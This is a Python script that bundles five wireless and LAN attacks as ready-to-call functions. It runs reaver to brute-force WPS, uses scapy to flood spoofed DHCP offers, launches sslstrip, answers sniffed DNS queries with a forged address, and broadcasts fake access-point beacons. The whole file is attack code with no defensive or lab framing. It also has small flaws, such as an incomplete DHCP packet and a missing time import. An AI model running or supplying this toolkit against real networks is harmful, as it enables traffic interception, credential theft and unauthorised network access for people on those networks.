import subprocess
from scapy.all import *

def perform_wps_bruteforce(target_mac, interface='wlan0'):
    command = f"reaver -i {interface} -b {target_mac} -vv"
    try:
        subprocess.run(command, shell=True, check=True)
        print("WPS Brute-force attack initiated.")
    except subprocess.CalledProcessError as e:
        print(f"Error occurred: {e}")

def perform_dhcp_spoofing(interface='eth0'):
    def send_dhcp_offer():
        dhcp_offer = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=67, dport=68)/BOOTP(op=2, chaddr="00:11:22:33:44:55")/DHCP(options=[("message-type", "offer"), ("server_id", "192.168.0.1"), ("lease_time", 3600), ("end")])
        sendp(dhcp_offer, iface=interface, verbose=0)

    print("Starting DHCP spoofing...")
    while True:
        send_dhcp_offer()

def perform_ssl_stripping(interface='eth0'):
    command = f"sslstrip -l 10000"
    try:
        subprocess.run(command, shell=True, check=True)
        print("SSL Stripping attack initiated.")
    except subprocess.CalledProcessError as e:
        print(f"Error occurred: {e}")

def perform_dns_spoofing(interface='eth0'):
    def spoof_dns(packet):
        if packet.haslayer(DNSQR):
            dns_response = IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=53)/DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata="1.2.3.4"))
            send(dns_response, iface=interface, verbose=0)
    
    print("Starting DNS spoofing...")
    sniff(iface=interface, prn=spoof_dns, filter="udp port 53", store=0)

def perform_karma_attack(interface='wlan0', ssid='FreeWiFi'):
    print(f"Starting Karma attack with SSID '{ssid}' on interface '{interface}'...")
    
    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2='12:34:56:78:9a:bc', addr3='12:34:56:78:9a:bc')
    beacon = Dot11Beacon()
    essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
    
    frame = RadioTap()/dot11/beacon/essid
    
    try:
        while True:
            sendp(frame, iface=interface, inter=0.1, loop=1)
            time.sleep(1)
    except KeyboardInterrupt:
        print("Karma attack stopped.")
